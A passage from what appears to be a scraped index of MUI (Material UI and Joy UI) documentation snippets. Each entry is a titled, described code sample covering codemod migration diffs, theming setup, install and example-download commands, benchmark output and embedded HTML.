CssVarsProvider, extendTheme } from '@mui/joy/styles';\nimport ScopedCssBaseline from '@mui/joy/ScopedCssBaseline';\nimport MyApp from './MyApp';\n\nconst theme = extendTheme({\n  components: {\n    JoyScopedCssBaseline: {\n      styleOverrides: {\n        root: ({ theme }) => ({\n          // ...CSS object styles\n        })\n      }\n    }\n  }\n})\n\nexport default function MyApp() {\n  const [root, setRoot] = React.useState(null);\n  return (\n    {/* target the node to ScopedCssBaseline's div */}\n    <CssVarsProvider colorSchemeNode={root}>\n      {/* must be used under CssVarsProvider */}\n      <ScopedCssBaseline ref={(element) => setRoot(element)}>\n        {/* The rest of your application */}\n        <MyApp />\n      </ScopedCssBaseline>\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Input Theme Default Props\nDESCRIPTION: Updates MuiInput theme configuration to use the new slots/slotProps API instead of components/componentsProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_55\n\nLANGUAGE: diff\nCODE:\n```\n MuiInput: {\n   defaultProps: {\n-    components: { Input: CustomInput, Root: CustomRoot }\n-    componentsProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }\n+    slots: { input: CustomInput, root: CustomRoot },\n+    slotProps: { input: { id: 'test-input-id' }, root: { id: 'test-root-id' } },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Downloading the Material UI CRA with Tailwind CSS Example in Bash\nDESCRIPTION: Command to download the Material UI example that combines CRA with Tailwind CSS in TypeScript, followed by changing into the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-tailwind-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-tailwind-ts\ncd material-ui-cra-tailwind-ts\n```\n\n----------------------------------------\n\nTITLE: Running Material-UI v6 Migration Codemods\nDESCRIPTION: These commands run the Material-UI codemods to migrate a codebase from using theme.palette.mode to theme.applyStyles for Material-UI v6 compatibility.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/styled <path/to/folder-or-file>\nnpx @mui/codemod@latest v6.0.0/sx-prop <path/to/folder-or-file>\nnpx @mui/codemod@latest v6.0.0/theme-v6 <path/to/theme-file>\n```\n\n----------------------------------------\n\nTITLE: Material-UI Styles Import Migration Codemod\nDESCRIPTION: This codemod moves JSS imports from @material-ui/core/styles to @material-ui/styles. It handles multiple imports and rearranges them appropriately to maintain compatibility with v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_93\n\nLANGUAGE: diff\nCODE:\n```\n-import {\n-  createGenerateClassName,\n-  createStyles,\n-  jssPreset,\n-  makeStyles,\n-  ServerStyleSheets,\n-  useThemeVariants,\n-  withStyles,\n-  withTheme,\n-  ThemeProvider,\n-  styled,\n-  getStylesCreator,\n-  mergeClasses,\n-} from '@material-ui/core/styles';\n+import { ThemeProvider, styled } from '@material-ui/core/styles';\n+import createGenerateClassName from '@material-ui/styles/createGenerateClassName';\n+import createStyles from '@material-ui/styles/createStyles';\n+import jssPreset from '@material-ui/styles/jssPreset';\n+import makeStyles from '@material-ui/styles/makeStyles';\n+import ServerStyleSheets from '@material-ui/styles/ServerStyleSheets';\n+import useThemeVariants from '@material-ui/styles/useThemeVariants';\n+import withStyles from '@material-ui/styles/withStyles';\n+import withTheme from '@material-ui/styles/withTheme';\n+import getStylesCreator from '@material-ui/styles/getStylesCreator';\n import mergeClasses from '@material-ui/styles/mergeClasses';\n```\n\n----------------------------------------\n\nTITLE: Updating CircularProgress Component Class Names in CSS\nDESCRIPTION: Shows the transformation of CircularProgress component CSS class names. The changes separate the state class (determinate/indeterminate) from the circle element class.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiCircularProgress-circleDeterminate\n+.MuiCircularProgress-determinate > .MuiCircularProgress-circle\n```\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiCircularProgress-circleIndeterminate\n+.MuiCircularProgress-indeterminate > .MuiCircularProgress-circle\n```\n\n----------------------------------------\n\nTITLE: Adjusting Strict Mode Spy Call Count Expectations - TypeScript\nDESCRIPTION: Sets the expected call count for spies in tests, adjusting for stricter behavior changes in React 19 StrictMode tests. This conditional expects either 4 or 2 calls, depending on React’s major version, reflecting changes in how React invokes effects and state updates under strict mode. Designed for test utility code. Dependencies: TypeScript, `reactMajor` value from test utils. Parameters: `reactMajor` (number). Outputs: expected spy call count (number).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/react-19-update.md#2025-04-22_snippet_1\n\nLANGUAGE: ts\nCODE:\n```\n// Spy call count\n//   1x during state initialization\n// + 1x during state initialization (StrictMode)\n// + 1x when sortedRowsSet is fired\n// + 1x when sortedRowsSet is fired (StrictMode) = 4x\n\n// Because of https://react.dev/blog/2024/04/25/react-19-upgrade-guide#strict-mode-improvements\n// from React 19 it is:\n//   1x during state initialization\n// + 1x when sortedRowsSet is fired\nconst expectedCallCount = reactMajor >= 19 ? 2 : 4;\n```\n\n----------------------------------------\n\nTITLE: Adding Material-UI Docs Remote Repository\nDESCRIPTION: Git command to add the material-ui-docs remote repository for documentation deployment.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit remote add material-ui-docs https://github.com/mui/material-ui-docs.git\n```\n\n----------------------------------------\n\nTITLE: Creating a Markdown Link to the Careers Page\nDESCRIPTION: This Markdown snippet creates a hyperlink. The visible link text is \\\"Visit our careers page now!\\\", and it points to the relative path `/careers/`, presumably the company's careers page.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2023-mui-values.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n[Visit our careers page now!](/careers/)\n```\n\n----------------------------------------\n\nTITLE: Running Material UI CDN Example\nDESCRIPTION: Commands to open the example in a browser, with options for both React 18 and React 19+ versions.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-via-cdn/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# React 19 or later\nopen index.html\n# React 18\nopen react-18-example.html\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Lab Package using NPM\nDESCRIPTION: Command to install the @mui/lab package which contains experimental Material-UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-lab/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/lab\n```\n\n----------------------------------------\n\nTITLE: Updating FormControlLabel Theme Default Props\nDESCRIPTION: Updates MuiFormControlLabel theme configuration to use the new slotProps API instead of componentsProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_34\n\nLANGUAGE: diff\nCODE:\n```\n MuiFormControlLabel: {\n   defaultProps: {\n-    componentsProps={{ typography: typographyProps }}\n+    slotProps={{ typography: typographyProps }}\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Fixed Spacing in Masonry\nDESCRIPTION: Examples of implementing fixed spacing between Masonry items using the spacing prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nFixedSpacing.js\n```\n\n----------------------------------------\n\nTITLE: Documenting Initial Release in Markdown\nDESCRIPTION: This code snippet represents the Markdown syntax used to document the initial 1.0.0 release of the MUI Material-UI project as an npm package. It uses heading levels to structure the changelog information.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/test-utils/CHANGELOG.md#2025-04-22_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n# Changelog\n\n## 1.0.0\n\nInitial release as an npm package.\n```\n\n----------------------------------------\n\nTITLE: Embedding Company Value Illustrations using HTML img Tag\nDESCRIPTION: This HTML `img` tag embeds a specific image (`values-illustrations.png`) used to visually represent MUI's company values. It includes attributes for accessibility (alt text), image source, display dimensions, and lazy loading for performance optimization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2023-mui-values.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<img alt=\\\"Custom-designed illustrations for each MUI company value.\\\" src=\\\"/static/blog/2023-mui-values/values-illustrations.png\\\" width=\\\"2400\\\" height=\\\"1000\\\" loading=\\\"lazy\\\" />\n```\n\n----------------------------------------\n\nTITLE: Tabs Scroll Buttons Codemod Example\nDESCRIPTION: This codemod updates the Tabs component's scrollButtons prop values to match the new API in Material-UI v5, replacing string values with boolean or object properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_112\n\nLANGUAGE: diff\nCODE:\n```\n-<Tabs scrollButtons=\"on\" />\n-<Tabs scrollButtons=\"desktop\" />\n-<Tabs scrollButtons=\"off\" />\n+<Tabs scrollButtons allowScrollButtonsMobile />\n+<Tabs scrollButtons />\n+<Tabs scrollButtons={false} />\n```\n\n----------------------------------------\n\nTITLE: Fetching Latest Documentation Changes\nDESCRIPTION: Git command to fetch the latest changes from the material-ui-docs remote repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit fetch material-ui-docs latest\n```\n\n----------------------------------------\n\nTITLE: Creating Warning Callout Block - Markup\nDESCRIPTION: Illustrates warning callout blocks in markdown using ':::warning' syntax, intended to caution users and highlight issues to avoid. Markup includes emphasized, bold, and code-formatted elements, as well as links. Requires a documentation processor that interprets this container style. Designed for static content with no additional dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/callouts.md#2025-04-22_snippet_2\n\nLANGUAGE: markup\nCODE:\n```\n:::warning\\nThis is a warning callout.\\nIt says, \\\"Be careful! Keep this detail in mind to avoid potential issues.\\\"\\n\\n- emphasised: **bold text**\\n- some code `<div/>`\\n- a [link](#link).\\n:::\n```\n\n----------------------------------------\n\nTITLE: Diamond Sponsor Display HTML\nDESCRIPTION: HTML snippet for displaying Diamond tier sponsor logos with specific styling and tracking attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/discover-more/backers/backers.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<p style=\"display: flex; justify-content: start; align-items: center; flex-wrap: wrap; margin-top: 8px;\">\n  <a data-ga-event-category=\"sponsor\" data-ga-event-action=\"docs-backers\" data-ga-event-label=\"doit.com\" href=\"https://www.doit.com/flexsave/?utm_source=mui.com&utm_medium=referral&utm_content=backers\" rel=\"noopener sponsored\" target=\"_blank\" class=\"remove-link-arrow\" class=\"remove-link-arrow\" style=\"margin-right: 24px;\"><img height=\"128\" width=\"128\" src=\"/static/sponsors/doit-square.svg\" alt=\"doit\" title=\"Management platform for Google Cloud and AWS\" loading=\"lazy\" /></a>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Migrating Tooltip Props to Slots API\nDESCRIPTION: Updates Tooltip component props to use the new slots API pattern, replacing legacy component and props structure\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_61\n\nLANGUAGE: diff\nCODE:\n```\n<Tooltip\n-  components={{ Arrow: CustomArrow }}\n-  componentsProps={{ arrow: { testid: 'test-id' } }}\n-  PopperComponent={CustomPopperComponent}\n-  TransitionComponent={CustomTransitionComponent}\n-  PopperProps={CustomPopperProps}\n-  TransitionProps={CustomTransitionProps}\n+  slots={{\n+    arrow: CustomArrow,\n+    popper: CustomPopperComponent,\n+    transition: CustomTransitionComponent,\n+  }}\n+  slotProps={{\n+    arrow: { testid: 'test-id' },\n+    popper: CustomPopperProps,\n+    transition: CustomTransitionProps,\n+  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Importing Typography Utilities from Material-UI System\nDESCRIPTION: Shows how to import typography-related utilities from the @mui/system package. These utilities can be used to apply typography styles in a more programmatic way.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_9\n\nLANGUAGE: js\nCODE:\n```\nimport { typography } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Running Real-world Benchmark with Bombardier\nDESCRIPTION: Commands to start the benchmark server and run Bombardier to test real-world performance of the Avatar component. The test uses 100 concurrent connections over 30 seconds, measuring requests per second and latency distribution.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/server/README.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\npnpm server:server\n\nbombardier \\\n  -c 100 \\\n  -l \\\n  -d 30s \\\n  -m GET \\\n  '0.0.0.0:3001/avatar'\n\nStatistics        Avg      Stdev        Max\n  Reqs/sec       442.47      55.44     547.63\n  Latency      225.64ms    17.11ms   471.31ms\n  Latency Distribution\n     50%   221.98ms\n     75%   230.69ms\n     90%   241.19ms\n     95%   247.87ms\n     99%   273.88ms\n  HTTP codes:\n    1xx - 0, 2xx - 26642, 3xx - 0, 4xx - 0, 5xx - 0\n    others - 0\n  Throughput:    11.61MB/s\n```\n\n----------------------------------------\n\nTITLE: Importing DialogContent Component in Joy UI\nDESCRIPTION: Import statement for the DialogContent component which creates a scrollable container inside the Drawer.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/drawer/drawer.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport DialogContent from '@mui/joy/DialogContent';\n```\n\n----------------------------------------\n\nTITLE: Creating DynamoDB Table with Provisioned Throughput\nDESCRIPTION: AWS CLI command to create a DynamoDB table with provisioned throughput for storing feedback data. The table uses 'id' as partition key and 'page' as sort key.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/feedback/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naws dynamodb create-table --profile claudia --region us-east-1 \\\n  --attribute-definitions AttributeName=id,AttributeType=S AttributeName=page,AttributeType=S \\\n  --key-schema AttributeName=id,KeyType=HASH AttributeName=page,KeyType=RANGE \\\n  --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=1 \\\n  --query TableDescription.TableArn --output text \\\n  --table-name feedback-dev\n```\n\n----------------------------------------\n\nTITLE: Badge Component HTML Structure\nDESCRIPTION: Shows the basic HTML structure of the Badge component, consisting of a root span element containing the child element and badge span.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/badge/badge.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<span class=\"MuiBadge-root\">\n  <!-- the element the Badge is attached to -->\n  <span class=\"MuiBadge-badge\">\n    <!-- Badge content -->\n  </span>\n</span>\n```\n\n----------------------------------------\n\nTITLE: Increasing CSS Specificity for Selected Menu Item (CSS)\nDESCRIPTION: This CSS snippet shows how to increase selector specificity when customizing Material UI components via direct class overrides, specifically for a selected MenuItem. The first rule applies a base color, while the second selector with .Mui-selected increases specificity to override styles when the menu item is selected. Users must be aware that Material UI's global classes allow direct targeting for state-based custom styling. The approach relies on global class names being available and requires developers to understand state classes in Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.MenuItem {\\n  color: black;\\n}\\n/* We increase the specificity */\\n.MenuItem.Mui-selected {\\n  color: blue;\\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Roboto Font via Google Web Fonts CDN\nDESCRIPTION: HTML code to include the Roboto font from Google Web Fonts CDN in a web project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/typography/typography.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin />\n<link\n  rel=\"stylesheet\"\n  href=\"https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap\"\n/>\n```\n\n----------------------------------------\n\nTITLE: InputBase Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated InputBase component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_50\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/input-base-props <path>\n```\n\n----------------------------------------\n\nTITLE: Next.js Pages Router App Configuration\nDESCRIPTION: Setup for configuring layer order in Next.js Pages Router using AppCacheProvider and GlobalStyles components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\nimport { AppCacheProvider } from '@mui/material-nextjs/v15-pagesRouter';\nimport GlobalStyles from '@mui/material/GlobalStyles';\n\nexport default function MyApp(props: AppProps) {\n  const { Component, pageProps } = props;\n  return (\n    <AppCacheProvider {...props}>\n      <GlobalStyles styles=\"@layer theme, base, mui, components, utilities;\" />\n      {/* Your app */}\n    </AppCacheProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing SliderUnstyled Component from MUI Base\nDESCRIPTION: Demonstrates importing the unstyled slider component from the @mui/base package. This provides slider functionality without predefined styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport { SliderUnstyled } from '@mui/base/SliderUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Including Theme Builder Component in Markdown\nDESCRIPTION: This snippet embeds the JoyThemeBuilder React component into the markdown documentation, which provides a visual interface for creating custom color palettes for Joy UI themes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-builder/theme-builder.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{\"component\": \"modules/components/JoyThemeBuilder.tsx\"}\n```\n\n----------------------------------------\n\nTITLE: Extending Pigment CSS Theme Types for TypeScript\nDESCRIPTION: TypeScript code to extend Pigment CSS theme types with Material UI Theme interface for proper type checking.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_11\n\nLANGUAGE: ts\nCODE:\n```\n// e.g. App.tsx\nimport { Theme } from '@mui/material/styles';\n\ndeclare module '@mui/material-pigment-css' {\n  interface ThemeArgs {\n    theme: Theme;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding TypeScript Demo Image using Markdown\nDESCRIPTION: Uses Markdown syntax to embed an image illustrating the availability of Material-UI demos in TypeScript. The syntax includes alternative text ('TypeScript demo') and the path to the image file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/november-2019-update.md#2025-04-22_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n![TypeScript demo](/static/blog/november-2019-update/typescript-demos.png)\n```\n\n----------------------------------------\n\nTITLE: Custom Theming with Color Schemes and CSS Variables in Material-UI (JavaScript)\nDESCRIPTION: This code sample builds upon isolated mode toggling by adding detailed custom palettes for both light and dark color schemes using Material-UI. It creates a ThemeProvider that receives customized palette definitions via the colorSchemes property, using props to drive CSS variable configuration. Requirements include @mui/material/styles and relevant palette objects; input props are cssVarPrefix and colorSchemeSelector. The output is a container whose theme can be varied for both color modes, offering fine control for documentation demos.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/demos.md#2025-04-22_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { ThemeProvider, createTheme, useColorScheme } from '@mui/material/styles';\\n\\nexport default function DemoModeToggleCustomTheme(props) {\\n  const theme = createTheme({\\n    cssVariables: {\\n      cssVarPrefix: props.cssVarPrefix,\\n      colorSchemeSelector: props.colorSchemeSelector || 'class',\\n    },\\n    colorSchemes: {\\n      light: {\\n        palette: {\\n          // ...custom palette\\n        },\\n      },\\n      dark: {\\n        palette: {\\n          // ...custom palette\\n        },\\n      },\\n    },\\n  });\\n  return (\\n    <ThemeProvider {...props} theme={theme}>\\n      ...\\n    </ThemeProvider>\\n  );\\n}\\n\n```\n\n----------------------------------------\n\nTITLE: Downloading Material UI Pigment CSS Vite Example\nDESCRIPTION: Commands to download the example project from the Material UI repository and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-pigment-css-vite-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-pigment-css-vite-ts\ncd material-ui-pigment-css-vite-ts\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Lab Dependencies\nDESCRIPTION: Command to install the required peer dependencies - Material-UI core components and Emotion styling library.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-lab/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Recast Options Configuration - Bash Command\nDESCRIPTION: Demonstrates how to pass printer options to recast through jscodeshift's printOptions argument.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest <transform> <path> --jscodeshift=\"--printOptions='{\\\"quote\\\":\\\"double\\\"}'\"\n```\n\n----------------------------------------\n\nTITLE: Displaying Survey Results Image in Markdown\nDESCRIPTION: This snippet shows how to embed an image in Markdown to display survey results. It includes the image source, dimensions, loading attribute, and alt text describing the survey results.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-developer-survey-results.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n<img src=\"/static/blog/2021-developer-survey-results/3.png\" width=\"2400\" height=\"1256\" loading=\"lazy\" alt=\"This question results in 2019 - Design: 248; Time: 193; DX: 128; Components: 89; Customizability: 53; Documentation: 25; Accessibility: 5; TypeScript: 5; Community support: 4; This question results in 2021 - Time: 597; Design: 407; Components: 309; DX: 306; Customizability: 181; Documentation: 57; Community support: 26; Accessibility: 24; Performance: 17\" />\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI CRA Example with npm\nDESCRIPTION: Commands to install project dependencies and start the development server for the Material UI CRA example with Tailwind CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-tailwind-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Embedding Before-State Avatar Loading Video using HTML\nDESCRIPTION: Embeds a video using the HTML <video> tag to demonstrate the loading experience of the Material-UI Avatar component before recent improvements. The video is configured to autoplay, loop, be muted, and play inline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/november-2019-update.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<video autoplay muted loop playsinline width=\"872\" height=\"154\">\n  <source src=\"/static/blog/november-2019-update/loading-avatar-before.mp4\" type=\"video/mp4\" />\n</video>\n```\n\n----------------------------------------\n\nTITLE: Running Pagination Round to Circular Codemod Command\nDESCRIPTION: Command to execute the pagination-round-circular codemod on a specified path. This renames shape values from 'round' to 'circular' in Pagination components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_103\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/pagination-round-circular <path>\n```\n\n----------------------------------------\n\nTITLE: Importing Components from Both Material-UI Versions\nDESCRIPTION: Demonstrates how to import components from both v0.x and v1.x versions of Material-UI in the same file for gradual migration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport FlatButton from 'material-ui/FlatButton'; // v0.x\nimport Button from '@material-ui/core/Button'; // v1.x\n```\n\n----------------------------------------\n\nTITLE: Custom Responsive Image Styling for Blog Post (CSS)\nDESCRIPTION: Applies responsive height settings to an image element with the ID 'blog-responsive-image' in the blog post. Uses standard CSS and a media query to adjust height on narrow screens. Injected via a <style> block in Markdown, this snippet can be placed in the HTML head or anywhere markdown supports embedded style. Adjust the ID selector if your HTML markup differs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v8.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n#blog-responsive-image {\n  height: 230px;\n  @media (max-width: 600px) {\n    height: 167px;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Emotion Props Handling in MUI Components\nDESCRIPTION: Shows how Emotion props like 'as' are not propagated when using the component prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<MuiComponent component={SomeOtherComponent} as=\"button\" />\n```\n\n----------------------------------------\n\nTITLE: Embedding Framer X Support Image using HTML\nDESCRIPTION: Embeds an image showcasing the newly added Framer X support for Material-UI using the HTML <img> tag. The 'src' attribute points to the image file, 'alt' provides text description, and 'width' sets the display width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/november-2019-update.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"/static/blog/november-2019-update/framer.jpg\" alt=\"Framer X\" width=\"300\" />\n```\n\n----------------------------------------\n\nTITLE: Customizing OG Card Content using Markdown Frontmatter\nDESCRIPTION: This markup snippet demonstrates how to override the default Open Graph card title and description within a Markdown file's frontmatter (header section delimited by `---`). Use the `cardTitle` and `cardDescription` keys to provide custom text. Asterisks (`*`) within the `cardTitle` value delimit text sections that should be highlighted in the generated image.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/og-card.md#2025-04-22_snippet_0\n\nLANGUAGE: markup\nCODE:\n```\n--\ncardTitle: A *different* title than the page title\ncardDecription: The word \"different\" on the title is highlighted\n--\n```\n\n----------------------------------------\n\nTITLE: Updating Typography Variant Mapping\nDESCRIPTION: Prop rename from headlineMapping to variantMapping for better clarity.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n-<Typography headlineMapping={headlineMapping}>\n+<Typography variantMapping={variantMapping}>\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Grid Spacing in React\nDESCRIPTION: This snippet demonstrates how to use the new Grid component features in Material-UI v5, including row and column spacing, responsive values, and custom column counts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q2-update.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container rowSpacing={1} columnSpacing={2} />\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container spacing={{ xs: 2, md: 3 }} />\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container columns={16}>\n```\n\n----------------------------------------\n\nTITLE: Running Pigment CSS Vite Demo App in Preview Mode\nDESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Vite demo app in preview mode after automatically building it.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/README.md#2025-04-22_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\npnpm nx run @app/pigment-css-vite-app:preview\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Original Import Format in Material-UI Build Output\nDESCRIPTION: Example showing the current import format in Material-UI's build output before applying the plugin. These imports follow Node.js resolution which allows omitting file extensions.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/babel-plugin-resolve-imports/README.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\n// packages/mui-material/build/index.js\nexport * from './Accordion';\n\n// packages/mui-material/build/Breadcrumbs/BreadcrumbCollapsed.js\nimport MoreHorizIcon from '../internal/svg-icons/MoreHoriz';\n```\n\n----------------------------------------\n\nTITLE: Updating import paths for Material UI v1.0.0\nDESCRIPTION: This codemod flattens the import paths by changing from destructured imports to direct component imports, which aligns with Material UI v1.0.0's new structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_120\n\nLANGUAGE: diff\nCODE:\n```\n-import { MenuItem } from '@material-ui/core/Menu';\n+import MenuItem from '@material-ui/core/MenuItem';\n```\n\n----------------------------------------\n\nTITLE: Responsive Netlify Logo HTML Implementation\nDESCRIPTION: HTML code for displaying the Netlify logo with dark/light mode support using the picture element.\nSOURCE: https://github.com/mui/material-ui/blob/master/README.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://mui.com/static/readme/netlify-darkmode.svg\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://mui.com/static/readme/netlify-lightmode.svg\">\n  <img alt=\"Netlify logo\" src=\"https://mui.com/static/readme/netlify-lightmode.svg\" width=\"100\" height=\"27\">\n</picture>\n```\n\n----------------------------------------\n\nTITLE: Styling Blog Text using HTML p Tag with Class\nDESCRIPTION: Uses an HTML `<p>` tag with a specific CSS class (`blog-description`) to display and style a descriptive text element within the blog post. This is likely used in conjunction with a CSS stylesheet to apply specific formatting rules defined for 